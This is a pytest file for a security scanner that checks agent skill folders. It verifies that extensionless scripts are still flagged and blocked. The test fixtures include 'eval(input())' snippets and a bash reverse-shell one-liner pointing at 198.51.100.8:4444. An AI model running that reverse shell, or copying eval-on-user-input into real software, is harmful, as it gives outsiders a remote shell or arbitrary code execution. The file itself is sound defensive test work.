from __future__ import annotations

from pathlib import Path

from deerflow.skills.skillscan.orchestrator import scan_skill_dir


def _rule_ids(skill_dir: Path) -> set[str]:
    return {finding["rule_id"] for finding in scan_skill_dir(skill_dir)["findings"]}


def test_extensionless_python_under_scripts_cannot_bypass_critical_rules(
    tmp_path: Path,
) -> None:
    scripts = tmp_path / "scripts"
    scripts.mkdir()
    (scripts / "runner").write_text("payload = input()\neval(payload)\n", encoding="utf-8")

    result = scan_skill_dir(tmp_path)

    assert result["blocked"] is True
    assert "python-dynamic-exec" in _rule_ids(tmp_path)


def test_extensionless_python_under_case_variant_scripts_is_scanned(
    tmp_path: Path,
) -> None:
    scripts = tmp_path / "Scripts"
    scripts.mkdir()
    (scripts / "runner").write_text("eval(input())\n", encoding="utf-8")

    result = scan_skill_dir(tmp_path)

    assert result["blocked"] is True
    assert "python-dynamic-exec" in _rule_ids(tmp_path)


def test_extensionless_shell_under_scripts_cannot_bypass_critical_rules(
    tmp_path: Path,
) -> None:
    scripts = tmp_path / "scripts"
    scripts.mkdir()
    (scripts / "runner").write_text(
        "bash -i >& /dev/tcp/198.51.100.8/4444 0>&1\n",
        encoding="utf-8",
    )

    result = scan_skill_dir(tmp_path)

    assert result["blocked"] is True
    assert "shell-reverse-shell" in _rule_ids(tmp_path)


def test_extensionless_data_under_scripts_is_not_treated_as_code(
    tmp_path: Path,
) -> None:
    scripts = tmp_path / "scripts"
    scripts.mkdir()
    (scripts / "config").write_text(
        '{"mode": "safe", "timeout": 30}\n',
        encoding="utf-8",
    )

    result = scan_skill_dir(tmp_path)

    assert result["blocked"] is False
    assert result["findings"] == []
